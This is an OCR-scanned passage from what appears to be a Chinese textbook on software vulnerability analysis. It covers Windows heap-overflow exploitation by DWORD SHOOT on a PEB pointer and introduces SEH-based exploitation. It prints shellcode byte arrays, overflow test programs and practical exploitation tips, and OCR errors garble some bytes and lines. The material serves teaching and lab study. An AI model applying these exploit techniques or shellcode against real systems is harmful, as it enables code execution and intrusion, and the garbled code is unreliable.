MOV[EAX].EBX
"x89x18
将这3条指令的机器码放在shellcode之前，重新调整shellcode的长度为200字节，然后
173
---
## Page 199
day
0
是8字节块首，8字节伪造的指针。
安
#include
全
char shellcode[]=
：
软
件
"\x90\x90\x901x90"
漏
//repairethepointer which shooted by heap over run
洞
"\XB8\x20\XF0\XFD\X7F*//MOVEAX,7FFDF020
分
\xBB\x4C\xAA\xF8\x77//MOV EBX,77F8AA4C the address mayreleatedto
析
//youros
技
\X89\X18*//MOVDWORDPTRDS:[EAX],EBX
术
\xFC\x68\x6A1x0A\x38\x1E\x68\x63\x89\xD1\x4F\x68\x32\x74\x91\x0C
（第
"\x8B\xF4\x8D\x7E\xF4\x33\xDB\xB7\x04\x2B\xE3\x66\xBB\x33\x32\x53
\x68\x75\x73\x65\x72\x54\x33\xD2\x64\x8B\x5A\x30\x8B\x4B\x0C\x8B
2
"x49\x1CIx8B\x09\x8B\x69\x08\xAD\x3D\x6A\x0A1x38\X1E\x75\x05\x95*
版
"\xFF\x57\xF8\x95\x60\x8B\x45\x3C\x8B\x4C\x05\x78\x03\xCD\x8B\x59*
"\x20\x03\xDD\x33\xFF\x47\x8B\x34\xBB\x03\xF5\x99\x0F\xBE\x06\x3A
"\xC4\x74\x08\xC1\xCA\x07\x03\xD0\x46\xEB\xF1\x3B\x54\x24\x1C\x75
"\xE4\x8B\x59\×24\x03\xDD\x66\x8B\x3C\×7B\x8B\x59\x1C\x03\xDD\x03*
\x2C\xBB\x95\x5F\xAB\x57\x61\x3D\x6A\x0A\x38\x1E\x75\xA9\x33\xDB*
"\x53\x68\x77\x65\x73\×74\x68\x66\×61\x69\x6C1x8B\xC4\x53\x50\x50
\x53\xFF\x57\xFC\x53\xFF\x57\xF8\x90\x90\x90\x90\x90\x90\x90\x90*
"\x16\x01\xlA\x00\x00\x10\x00\x00*//headoftheajacent freeblock
"\x88\x06\x52\x00\x20\xf0\xfd\x7f*:
//make sure this address via debug
//0x7ffdf020 isthe position in PEB which hold a pointer to
//RtlEnterCriticalSection()and will be called by ExitProcess()at last
main()
HLOCALh1=0,h2=0;
HANDLE hp:
hp=HeapCreate（0,0x1000,0x10000);
h1=HeapA11oc(hp,HEAP_ZERO_MEMORY,200);
memcpy(h1,she11code,0x200);//overf1ow,0x200=512
h2=HeapA11oc（hp,HEAP_ZERO_MEMORY,8);
return 0;
好了，现在把断点去掉，build后直接运行。先是提示有异常产生（堆都溢出了，产生异常
也很正常），如图5.4.2所示。
174
---
## Page 200
第
5
章
堆溢出利
.
用
图5.4.2堆溢出导致程序出错
随便单击“确定”按钮或“取消”按钮之后，显示“failwest”的消息框就会跳出来，如图
5.4.3所示。
图5.4.3在程序临退出前shellcode得到执行
5.4.3堆溢出利用的注意事项
比起栈溢出来说，堆溢出相对复杂，在调试时遇到的限制也比较多。结合我个人的调试经
验，下面列出一些可能出现的问题。
1.调试堆与常态堆的区别
如我们在5.2节中介绍的那样，堆管理系统会检测进程是否正在被调试。调试态的堆和常
态堆是有很大区别的，没有经验的初学者在做堆溢出实验时往往会被误导去研究调试态的堆。
如果您发现自己的shllecode能在调试器中得到正常的执行，而单独运行程序却失败，不妨考虑
175
---
## Page 201
day
0
一下这方面的问题。本章中使用了int3中断指令在堆分配之后暂停程序，然后attach进程的
安
方法。这是一种省事的做法，但大多数时候我们是无法修改源码的。另一种办法是直接修改用
全
于检测调试器的函数的返回值，这种方法在调试异常处理机制时会经常用到，我们将在第6章
：
中举例介绍。
软
件
2.在shellcode中修复环境
漏
本节实验中就遇到了这样的问题，在劫持进程后需要立刻修复PE.B中的函数指针，否则
洞
会引起很多其他异常。一般说来，在大多数堆溢出中都需要做一些修复环境的工作。
分
析
shellcode中的第一条指令CDF也是用来修复环境的。如果您把这条指令去掉，会发现
技
shellcode自身发生内存读写异常。这是因为在ExitProcessO调用时，这种特殊的上下文会把通
术
常状态为O的DF标志位修改为1。这会导致shellcode中LODSDWORDPTRDS:[ESI]指令在
（第
向EAX装入第一个hash后将ESI减4，而不是通常的加4，从而在下一个函数名hash读取时
2
发生错误。
版
在堆溢出中，有时还需要修复被我们折腾得乱七八糟的堆区。通常，比较简单修复堆区的
做法包括如下步骤。
（1）在堆区偏移Ox28的地方存放着堆区所有空闲块的总和TotalFreeSize。
））
的两个字节（selfsize）修改成堆区空闲块总容量的大小（TotalFreeSize）。
（3）把该块的flag位设置为Ox10（lastentry尾块）。
（4）把freelist[O]的前向指针和后向指针都指向这个堆块。
这样可以使整个堆区“看起来好像是”刚初始化完只有一个大块的样子，不但可以继续完
成分配工作，还保护了堆中已有的数据。
3.定位shellcode的跳板
有时，堆的地址不固定，因此我们不能像本节实验中这样在DWORDSHOOT时直接使用
shellcode的起始地址。在3.3节里我们介绍了很多种定位栈中shellcode的思路。和栈溢出中的
jmpesp一样，经常也会有寄存器指向堆区离shellcode不远的地方。比如DavidLitchfield在black
hat上的演讲中指出的在利用U.E.F时可以使用几种指令作为跳板定位shellcode，这些指令一
般可以在netapi32.dll、user32.dll、rpcrt4.dll中搜到不少，代码如下所示。
CALLDWORD PTREDI+OX78]
CALLDWORD PTR[ESI+OX4C]
CALLDWORD PTR[EBP+0X74]
4.DWORDSHOOT后的“指针反射”现象
回顾前面介绍DWORDSHOOT时所举的例子：
int remove(ListNode *node)
176
---
## Page 202
第
5
章
return0;
堆
溢
其中，node->blink->flink=node->flink将会导致DwORDSHOOT。细心的读者可能会
出
发现双向链表拆除时的第二次链表操作node->flink->blink=node->blink也能导致DWORD
利
SHOOT。这次，DWORDSHOOT将把目标地址写回shellcode起始位置偏移4个字节的地方。
用
有时在指针反射发生前就会产生异常。然而，大多数情况下，指针反射是会发生的，糟糕
的是，它会把目标地址刚好写进shellcode中。这对于没有跳板直接利用DWORDSHOOT劫持
进程的exploit来说是一个很大的限制，因为它将破坏4个字节的shellcode。
幸运的是，很多情况下4个字节的目标地址都会被处理器当做“无关痛痒”的指令安全地
执行过去。例如，我们本节实验中就会把Ox7FFDF020反射回shellcode中偏移4字节的位置
0x0052068C，如图5.4.4所示。
AddressHex dunp
Pisasserbiy
0252068894
NOP
0x7FFDF020被回射到shellcode
偏移4字节的地方，但是指针值
085206
可以被解码为有效的机器指令
22F
ANDAL,DH
不影响shecode的整体执行
7F98
STU
38523691
Shellcode
s2rwD7
HOU ER
Ds,ntail.atltnterDrititalsection
FDFeze
DOiD P1K PS:[EAXI,EB]
6A3811
([3:)
749.106
BOUESI,ESP
LEA (DI,DURD PIRDS:[FSTC]
XOR EBXEBX
:0B 3332
CEZE*XO 0OH
75736572
54
图5.4.4指针反射现象
但如果在为某个特定漏洞开发exploit时，指针反射发生且目标指针不能当做“无关痛痒”
的指令安全地执行过去，那就得开动脑筋使用别的自标，或者使用跳板技术。这也是我介绍了
很多种利用思路给大家的原因一要不然就只有自认倒霉了。
堆溢出博大精深，需要在调试中不断积累经验。如果您苦思冥想仍然不能按照预期运行
shellcode，不妨想想上面这几方面的问题，很可能会给您一点启发。
177
---
## Page 203
第6章形形色色的内存攻击技术
大道不过二三四，漏洞利用技术无外乎溢出、跳转、指令、指针…如果您已经明白“大
道”，不妨一起来看看高手们是怎样为“大道”添加艺术气息的。本章将抛开调试和实验，集
中介绍近年来一些薪型的漏洞利用思路和攻击技巧。
不论是作为安全技术工作者还是黑客技术爱好者，时刻更新自己的知识都是非常重要的。
对于安全专家，了解这些技巧和手法不至于在分析漏洞时错把可以利用的漏洞误判为低风险类
型：对于黑客技术爱好者，这些知识很可能成为激发技术灵感的火花。
6.1狙击Windows异常处理机制
6.1.1S.E.H概述
操作系统或程序在运行时，滩免会遇到各种各样的错误，如除零、非法内存访问、文件打
开错误、内存不足、磁盘读写错误、外设操作失败等。为了保证系统在遇到错误时不至于崩溃，
仍能够健壮稳定地继续运行下去，Windows会对运行在其中的程序提供一次补救的机会来处理
错误，这种机制就是异常处理机制。
S.E.H即异常处理结构体（StructureExceptionHandler），它是Windows异常处理机制所采
用的重要数据结构。每个S.E.H包含两个DWORD指针：S.E.H链表
指针和异常处理函数句柄，共8个字节，如图6.1.1所示。
DWORD: Next S.E.H recoder
作为对S.E.H的初步了解，我们现在只需要知道以下几个要点，
DWORD: Exception handler
S.E.H链表如图6.1.2所示。
（1）S.E.H结构体存放在系统栈中。
图6.1.1S.E.H结构体
（2）当线程初始化时，会自动向栈中安装一个S.E.H，作为线程默认的异常处理。
（3）如果程序源代码中使用了_try(）_except()或者Assert宏等异常处理机制，编译器将
最终通过尚当前函数栈顿中安装一个S.E.H来实现异常处理。
（4）栈中一般会同时存在多个S.E.H。
（5）栈中的多个S.E.H通过链表指针在栈内由栈顶向栈底串成单向键表，位于键表最顶端
的S.E.H通过T.E.B（线程环境块）O字节偏移处的指针标识。
（6）当异常发生时，操作系统会中断程序，并首先从T.E.B的O字节偏移处取出距离栈顶
最近的S.E.H，使用异常处理函数句柄所指向的代码来处理异常。
---
## Page 204
第
的异常处理函数。
6
（8）如果程序安装的所有异常处理函数都不能处理，系统将采用默认的异常处理函数。通
章
常，这个函数会弹出一个错误对话框，然后强制关闭程序。
形
TEB FS:0
形
（线程环境块）
色色
的
内存攻击技术
Next S.E.H Recorder
Exception handler
异常处理函数
*+*+
*****
Next S.E.H Recorder
Exception handler
异常处理函数
Next S.E.H Recorder
Exception handler
异常处理函数
图6.1.2S.E.H链表
提示：为了让您迅速理解基于SEH的异常处理机制，这里的表述做了一定的简化，
省略了很多细节。例如，系统对异常处理函数的调用可能不止一次；对于同一个函数
内的多个_try或嵌套的_try需要进行S.E.H展开操作（unwind）；执行异常处理函数
前会进行若干判定操作；线程异常处理、进程异常处理和操作系统异常处理之间的调
用顺序和优先级关系等都未提及。我们将会在本章的后续小节中对异常处理进行逐步
深入的讨论。
从程序设计的角度来讲，S.E.H就是在系统关闭程序之前，给程序一个执行预先设定的回
调函数（callback）的机会。大概明白了S.E.H的工作原理之后，聪明的读者朋友们可能已经
发现了问题所在。
（1）S.E.H存放在栈内，故溢出缓冲区的数据有可能淹没S.E.H。
（2）精心制造的溢出数据可以把S.E.H中异常处理函数的入口地址更改为shellcode的起始
地址。
（3）溢出后错误的栈帧或堆块数据往往会触发异常。
（4）当Windows开始处理溢出后的异常时，会错误地把shellcode当作异常处理函数而
执行。
以上就是利用Windows异常处理机制的基本思路。对异常处理机制的利用是Windows平
179
---
## Page 205
0
day
台下漏洞利用的一大特色，方法也多种多样。利用异常处理机制往往也是一些高级漏洞利用技
安
术的关键所在。
全
接下来我们将通过两个小实验来分别练习在栈溢出场景中和堆溢出场景中利用S.E.H的
：
基本技术。
软件
6.1.2在栈溢出中利用S.E.H
漏
洞
我们通过对以下代码的调试来进一步体会在栈溢出中利用SE.H的方法。
分
析
#include 
技
charshel1code[]=\x90\x90\x90\x90....;
术
DWORD MyExceptionhandler(void)
（第
printf("got an exception,press Enter to kill process!\n");
2
getchar();
版
ExitProcess(1);
voidtest(char*input)
charbuf[200];
int zero=0;
asmint3//usedtobreakprocess for debug
try
strcpy(buf,input);//overrunthe stack
zero=4/zero;//generate anexception
_except(MyExceptionhandler())()
main()
test(shellcode);
对代码简要解释如下。
（1）函数test中存在典型的栈溢出漏洞。
（2）_try{会在test的函数栈帧中安装一个S.E.H结构。
（3）_try中的除零操作会产生一个异常。
（4）当strcpy操作没有产生溢出时，除零操作的异常将最终被MyExceptionhandler函数
处理。
（5）当strcpy操作产生溢出，并精确地将栈顿中的S.E.H异常处理句柄修改为shellcode的
入口地址时，操作系统将会错误地使用shellcode去处理除零异常，也就是说，代码植入成功。
（6）此外，异常处理机制与堆分配机制类似，会检测进程是否处于调试状态。如果直接使
180
---
## Page 206
第
用调试器加载程序，异常处理会进入调试状态下的处理流程。因此，我们这里同样采用直接在
6
代码中加入断点_asmint3，让进程自动中断后再用调试器attach的方法进行调试。
章
这个实验的关键在于确定栈帧中S.E.H回调句柄的偏移，然后布置缓冲区，精确地淹没这
形
个位置，将该句柄修改为shellcode的起始位置。
形色色的内存攻击技术
实验环境如表6-1-1所示。
表6-1-1实验环境
推荐使用的环境
备
注
操作系统
Windows2000
虚拟机和实体机均可。本指导测试于虚拟机中
编译器
Visual C++ 6.0